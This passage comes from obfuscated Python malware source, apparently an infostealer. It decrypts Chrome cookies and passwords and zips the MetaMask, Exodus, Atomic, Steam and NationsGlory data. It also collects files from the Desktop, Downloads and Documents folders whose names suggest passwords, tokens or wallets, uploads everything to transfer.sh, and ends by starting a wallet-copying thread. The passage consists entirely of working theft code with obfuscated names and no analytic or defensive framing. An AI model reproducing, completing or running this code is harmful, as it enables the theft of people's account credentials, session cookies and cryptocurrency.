    OO00O00000OO0O000 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:1527
    O000O000OOO00O0OO =OO00O00000OO0O000 .fetchall ()#line:1528
    OO00O00000OO0O000 .close ()#line:1529
    OO00O000O00OOOO0O .close ()#line:1530
    os .remove (OOO00OOO00OOO0OO0 )#line:1531
    O00000OO000OOO0O0 =OO0O0OOOO0O000O0O +"/Local State"#line:1533
    with open (O00000OO000OOO0O0 ,'r',encoding ='utf-8')as O0O0OO00O0OO0OOOO :O00000O00O0O0O0OO =loads (O0O0OO00O0OO0OOOO .read ())#line:1535
    OO0OOOO00O0O00O00 =b64decode (O00000O00O0O0O0OO ['os_crypt']['encrypted_key'])#line:1536
    OO0OOOO00O0O00O00 =CryptUnprotectData (OO0OOOO00O0O00O00 [5 :])#line:1537
    for O0O0OO000000O0OO0 in O000O000OOO00O0OO :#line:1539
        if O0O0OO000000O0OO0 [0 ]!='':#line:1540
            for OOOO00OO0OO0000OO in keyword :#line:1541
                OOOO00OOO0OO00000 =OOOO00OO0OO0000OO #line:1542
                if "https"in OOOO00OO0OO0000OO :#line:1543
                    O0O0OOOOOO0O000O0 =OOOO00OO0OO0000OO #line:1544
                    OOOO00OO0OO0000OO =O0O0OOOOOO0O000O0 .split ('[')[1 ].split (']')[0 ]#line:1545
                if OOOO00OO0OO0000OO in O0O0OO000000O0OO0 [0 ]:#line:1546
                    if not OOOO00OOO0OO00000 in cookiWords :cookiWords .append (OOOO00OOO0OO00000 )#line:1547
            Cookies .append (f"{O0O0OO000000O0OO0[0]}	TRUE"+"		"+f"/FALSE	2597573456	{O0O0OO000000O0OO0[1]}	{DecryptValue(O0O0OO000000O0OO0[2], OO0OOOO00O0O00O00)}")#line:1549
    writeforfile (Cookies ,'zg_allcookies')#line:1551
def checkIfProcessRunning (O00OO0O00OO0OO0OO ):#line:1553
    ""#line:1556
    for O0O0OO0O0000OOOOO in psutil .process_iter ():#line:1558
        try :#line:1559
            if O00OO0O00OO0OO0OO .lower ()in O0O0OO0O0000OOOOO .name ().lower ():#line:1561
                return True #line:1562
        except (psutil .NoSuchProcess ,psutil .AccessDenied ,psutil .ZombieProcess ):#line:1563
            pass #line:1564
    return False ;#line:1565
def ZipThings (OO00O00O0O0000000 ,O00OO00OOO0OOO0O0 ,O00O0000OO00O0O00 ):#line:1568
    O0O0000OO0000OO00 =OO00O00O0O0000000 #line:1569
    O0OOOOOOO0OO00000 =O00OO00OOO0OOO0O0 #line:1570
    if "aholpfdialjgjfhomihkjbmgjidlcdno"in O00OO00OOO0OOO0O0 :#line:1571
        O00OOO0000000O000 =OO00O00O0O0000000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1572
        O0OOOOOOO0OO00000 =f"Exodus_{O00OOO0000000O000}"#line:1573
        O0O0000OO0000OO00 =OO00O00O0O0000000 +O00OO00OOO0OOO0O0 #line:1574
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in O00OO00OOO0OOO0O0 :#line:1576
        O00OOO0000000O000 =OO00O00O0O0000000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1577
        O0OOOOOOO0OO00000 =f"Metamask_{O00OOO0000000O000}"#line:1578
        O0O0000OO0000OO00 =OO00O00O0O0000000 +O00OO00OOO0OOO0O0 #line:1579
    if not os .path .exists (O0O0000OO0000OO00 ):return #line:1581
    if checkIfProcessRunning ('chrome.exe'):#line:1582
        print ('Yes a chrome process was running')#line:1583
        subprocess .Popen (f"taskkill /im {O00O0000OO00O0O00} /t /f",shell =True )#line:1584
    else :#line:1585
        ...#line:1586
    if "Wallet"in O00OO00OOO0OOO0O0 or "NationsGlory"in O00OO00OOO0OOO0O0 :#line:1589
        O00OOO0000000O000 =OO00O00O0O0000000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:1590
        O0OOOOOOO0OO00000 =f"{O00OOO0000000O000}"#line:1591
    elif "Steam"in O00OO00OOO0OOO0O0 :#line:1593
        if not os .path .isfile (f"{O0O0000OO0000OO00}/loginusers.vdf"):return #line:1594
        O0OO0O00OO00OOO0O =open (f"{O0O0000OO0000OO00}/loginusers.vdf","r+",encoding ="utf8")#line:1595
        OO0OOO00000O00O00 =O0OO0O00OO00OOO0O .readlines ()#line:1596
        OOOOOOOO000O00OO0 =False #line:1597
        for O00O0OOOO0O00O0OO in OO0OOO00000O00O00 :#line:1598
            if 'RememberPassword"\t\t"1"'in O00O0OOOO0O00O0OO :#line:1599
                OOOOOOOO000O00OO0 =True #line:1600
        if OOOOOOOO000O00OO0 ==False :return #line:1601
        O0OOOOOOO0OO00000 =O00OO00OOO0OOO0O0 #line:1602
    O00O0OO000O0OOO00 =zipfile .ZipFile (f"{O0O0000OO0000OO00}/{O0OOOOOOO0OO00000}.zip","w")#line:1604
    print (O00O0OO000O0OOO00 )#line:1605
    for OO0OO000OOO0O0OOO in os .listdir (O0O0000OO0000OO00 ):#line:1606
        if not ".zip"in OO0OO000OOO0O0OOO :O00O0OO000O0OOO00 .write (O0O0000OO0000OO00 +"/"+OO0OO000OOO0O0OOO )#line:1607
    O00O0OO000O0OOO00 .close ()#line:1608
    upload (f'{O0O0000OO0000OO00}/{O0OOOOOOO0OO00000}.zip')#line:1610
    os .remove (f"{O0O0000OO0000OO00}/{O0OOOOOOO0OO00000}.zip")#line:1611
def grabb_GatherAll ():#line:1614
    ""#line:1615
    OOOO00OO0OO0O00OO =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:1625
    O0O0O0OO00OOOOO00 =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"]]#line:1634
    for OOOOO000OO00OO0OO in OOOO00OO0OO0O00OO :#line:1637
        OO00OO000O0000O00 =threading .Thread (target =getPassw ,args =[OOOOO000OO00OO0OO [0 ],OOOOO000OO00OO0OO [3 ]])#line:1638
        OO00OO000O0000O00 .start ()#line:1639
        Threadlist .append (OO00OO000O0000O00 )#line:1640
    O000O0O00O0OOOO00 =[]#line:1642
    for OOOOO000OO00OO0OO in OOOO00OO0OO0O00OO :#line:1643
        OO00OO000O0000O00 =threading .Thread (target =getCookie ,args =[OOOOO000OO00OO0OO [0 ],OOOOO000OO00OO0OO [4 ]])#line:1644
        OO00OO000O0000O00 .start ()#line:1645
        O000O0O00O0OOOO00 .append (OO00OO000O0000O00 )#line:1646
    for OO0000O00000OO000 in O000O0O00O0OOOO00 :OO0000O00000OO000 .join ()#line:1648
    OO0OOO0O0OO0OOO00 =Trust (Cookies )#line:1649
    if OO0OOO0O0OO0OOO00 ==True :return #line:1650
    for OOOOO000OO00OO0OO in OOOO00OO0OO0O00OO :#line:1652
        threading .Thread (target =ZipThings ,args =[OOOOO000OO00OO0OO [0 ],OOOOO000OO00OO0OO [5 ],OOOOO000OO00OO0OO [1 ]]).start ()#line:1653
    for OOOOO000OO00OO0OO in O0O0O0OO00OOOOO00 :#line:1655
        threading .Thread (target =ZipThings ,args =[OOOOO000OO00OO0OO [0 ],OOOOO000OO00OO0OO [2 ],OOOOO000OO00OO0OO [1 ]]).start ()#line:1656
    for OO0000O00000OO000 in Threadlist :#line:1658
        OO0000O00000OO000 .join ()#line:1659
    global upths #line:1660
    upths =[]#line:1661
    for O0OOOO00OOOOOO00O in ["zg_allpasswords.txt","zg_allcookies.txt"]:#line:1663
        upload (os .getenv ("TEMP")+"\\"+O0OOOO00OOOOOO00O )#line:1664
def zg_uploadanonfiles (OOOO00O0OO0OO0O0O ):#line:1667
    try :#line:1668
        O0O00OO0O0O0OO0OO ={"file":(OOOO00O0OO0OO0O0O ,open (OOOO00O0OO0OO0O0O ,mode ='rb'))}#line:1670
        ...#line:1671
        OOOOO00O000OO0O00 =requests .post ("https://transfer.sh/",files =O0O00OO0O0O0OO0OO )#line:1672
        O0O0O0OOO00O0OO0O =OOOOO00O000OO0O00 .text #line:1673
        return O0O0O0OOO00O0OO0O #line:1674
    except :#line:1675
        return False #line:1676
def zg_Folder_create (OO000OO0OO00O0000 ,O000OO0O000000OO0 ):#line:1678
    global zg_create_files #line:1679
    O00O00OO0OO0O000O =7 #line:1680
    O0O0OO0O00000OO0O =0 #line:1681
    O0000000O00O0OO0O =os .listdir (OO000OO0OO00O0000 )#line:1682
    OOOO000O00OOO00OO =[]#line:1683
    for O0O0000OOO0O0O000 in O0000000O00O0OO0O :#line:1684
        if not os .path .isfile (OO000OO0OO00O0000 +"/"+O0O0000OOO0O0O000 ):return #line:1685
        O0O0OO0O00000OO0O +=1 #line:1686
        if O0O0OO0O00000OO0O <=O00O00OO0OO0O000O :#line:1687
            OOOO0OOO0OO0000OO =zg_uploadanonfiles (OO000OO0OO00O0000 +"/"+O0O0000OOO0O0O000 )#line:1688
            OOOO000O00OOO00OO .append ([OO000OO0OO00O0000 +"/"+O0O0000OOO0O0O000 ,OOOO0OOO0OO0000OO ])#line:1689
        else :#line:1690
            break #line:1691
    zg_create_files .append (["folder",OO000OO0OO00O0000 +"/",OOOO000O00OOO00OO ])#line:1692
zg_create_files =[]#line:1694
def zg_create_file (OOOO00OOO00OOO00O ,OO0OO0OO00OO00O00 ):#line:1695
    global zg_create_files #line:1696
    OO0OO0OO0OOO0000O =[]#line:1697
    OO0OOOO0000O0OOO0 =os .listdir (OOOO00OOO00OOO00O )#line:1698
    for OO0O0OO00O0OO0O00 in OO0OOOO0000O0OOO0 :#line:1699
        for OOOOOO00OO000O000 in OO0OO0OO00OO00O00 :#line:1700
            if OOOOOO00OO000O000 in OO0O0OO00O0OO0O00 .lower ():#line:1701
                if os .path .isfile (OOOO00OOO00OOO00O +"/"+OO0O0OO00O0OO0O00 )and ".txt"in OO0O0OO00O0OO0O00 :#line:1702
                    OO0OO0OO0OOO0000O .append ([OOOO00OOO00OOO00O +"/"+OO0O0OO00O0OO0O00 ,zg_uploadanonfiles (OOOO00OOO00OOO00O +"/"+OO0O0OO00O0OO0O00 )])#line:1703
                    break #line:1704
                if os .path .isdir (OOOO00OOO00OOO00O +"/"+OO0O0OO00O0OO0O00 ):#line:1705
                    O000O0000OO00O0O0 =OOOO00OOO00OOO00O +"/"+OO0O0OO00O0OO0O00 #line:1706
                    zg_Folder_create (O000O0000OO00O0O0 ,OO0OO0OO00OO00O00 )#line:1707
                    break #line:1708
    zg_create_files .append (["folder",OOOO00OOO00OOO00O ,OO0OO0OO0OOO0000O ])#line:1710
def zg_checking ():#line:1712
    O0OOO0OOOO0000OO0 =temp .split ("\AppData")[0 ]#line:1713
    O00OO00OO00OO0O0O =[O0OOO0OOOO0000OO0 +"/Desktop",O0OOO0OOOO0000OO0 +"/Downloads",O0OOO0OOOO0000OO0 +"/Documents"]#line:1718
    O0O0O0OO0O0O0O0OO =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","seecret"]#line:1745
    OOOOOO0000O00OO00 =[]#line:1747
    for O000O000O0O0000O0 in O00OO00OO00OO0O0O :#line:1748
        OO0OOOOO0OO00OO0O =threading .Thread (target =zg_create_file ,args =[O000O000O0O0000O0 ,O0O0O0OO0O0O0O0OO ]);OO0OOOOO0OO00OO0O .start ()#line:1749
        OOOOOO0000O00OO00 .append (OO0OOOOO0OO00OO0O )#line:1750
    return OOOOOO0000O00OO00 #line:1751
global keyword ,cookiWords ,paswWords #line:1754
keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:1758
cookiWords =[]#line:1761
paswWords =[]#line:1762
grabb_GatherAll ()#line:1764
DETECTED =Trust (Cookies )#line:1765
if not DETECTED :#line:1767
    wikith =zg_checking ()#line:1768
    for thread in wikith :thread .join ()#line:1770
    time .sleep (0.2 )#line:1771
    filetext ="```diff\n"#line:1773
    for arg in zg_create_files :#line:1774
        if len (arg [2 ])!=0 :#line:1775
            foldpath =arg [1 ]#line:1776
            foldlist =arg [2 ]#line:1777
            filetext +=f"\n"#line:1778
            filetext +=f"- {foldpath}\n"#line:1779
            for ffil in foldlist :#line:1781
                a =ffil [0 ].split ("/")#line:1782
                fileanme =a [len (a )-1 ]#line:1783
                b =ffil [1 ]#line:1784
                filetext +=f"+ Name: {fileanme}\n+ Link: {b}"#line:1785
                filetext +="\n"#line:1786
    filetext +="\n```"#line:1787
    upload ("zg_checking",filetext )#line:1790
    auto =threading .Thread (target =auto_copy_wallet ().run )#line:1791
    auto .start ()